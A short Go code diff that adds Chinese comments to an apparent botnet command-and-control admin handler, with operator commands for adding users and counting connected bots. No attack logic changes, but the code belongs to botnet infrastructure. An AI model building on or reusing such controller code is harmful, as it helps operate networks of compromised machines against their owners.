@@ -13,6 +13,8 @@ type Admin struct {
     conn    net.Conn
 }
 
+
+//添加新用户
 func NewAdmin(conn net.Conn) *Admin {
     return &Admin{conn}
 }
@@ -118,7 +120,7 @@ func (this *Admin) Handle() {
         }
         botCount = userInfo.maxBots
 
-        if userInfo.admin == 1 && cmd == "adduser" {
+        if userInfo.admin == 1 && cmd == "adduser" {   //添加新用户
             this.conn.Write([]byte("Enter new username: "))
             new_un, err := this.ReadLine(false)
             if err != nil {
@@ -174,7 +176,7 @@ func (this *Admin) Handle() {
             }
             continue
         }
-        if userInfo.admin == 1 && cmd == "botcount" {
+        if userInfo.admin == 1 && cmd == "botcount" {  //botcount 命令
             m := clientList.Distribution()
             for k, v := range m {
                 this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
